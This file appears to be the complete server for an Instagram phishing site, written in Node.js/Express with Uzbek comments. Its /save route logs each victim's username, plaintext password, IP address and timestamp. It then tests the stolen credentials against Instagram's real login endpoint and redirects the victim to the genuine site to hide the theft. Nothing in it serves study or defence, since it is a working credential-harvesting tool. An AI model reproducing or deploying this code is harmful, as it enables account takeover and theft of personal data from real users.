const express = require("express");
const session = require("express-session");
const fetch = require("node-fetch");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Session - BU MAJBURIY
app.use(session({
    secret: 'insta123',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 600000 } // 10 daqiqa
}));

async function instagramTekshir(username, password) {
    try {
        const response = await fetch("https://www.instagram.com/accounts/login/ajax/", {
            method: "POST",
            headers: {
                "content-type": "application/x-www-form-urlencoded",
                "x-requested-with": "XMLHttpRequest",
                "x-ig-app-id": "936619743392459",
                "x-csrftoken": "missing",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            body: new URLSearchParams({
                username: username,
                enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`,
                queryParams: "{}",
                optIntoOneTap: "false"
            })
        });
        const data = await response.json();
        return data.authenticated === true;
    } catch (e) {
        return false;
    }
}

app.post("/save", async (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
    const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

    console.log(`TEKSHIRUV → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password}`);

    // Sessionda urinishlarni hisoblash
    if (!req.session.attempts) {
        req.session.attempts = 1;
    } else {
        req.session.attempts++;
    }

    console.log(`Urinishlar: ${req.session.attempts}/3`);

    // Agar 3 marta urinib ko'rgan bo'lsa
    if (req.session.attempts >= 3) {
        console.log(`3 MARTA → ${username} Instagramga yo'naltirildi`);
        req.session.destroy();
        return res.redirect("https://www.instagram.com");
    }

    const togri = await instagramTekshir(username, password);

    if (togri) {
        console.log(`MUVOFAQ → ${username} muvaffaqiyatli kirdi`);
        req.session.destroy();
        res.redirect("https://www.instagram.com");
    } else {
        console.log(`XATO → ${username} paroli noto'g'ri`);
        const qolgan = 3 - req.session.attempts;
        res.send(`
            <!DOCTYPE html>
            <html>
            <head><meta charset="utf-8"><title>Xato</title></head>
            <body style="font-family:sans-serif;background:#fafafa;text-align:center;padding-top:100px;">
                <h2 style="color:#ed4956;">Login yoki parol noto'g'ri</h2>
                <p>Urinish: ${req.session.attempts}/3 | Qolgan: ${qolgan} ta</p>
                <p>Iltimos, qayta urinib ko'ring</p>
                <script>setTimeout(() => location.href="/", 2500);</script>
            </body>
            </html>
        `);
    }
});

const port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", () => console.log("Instagram real tekshiruv ishlayapti"));
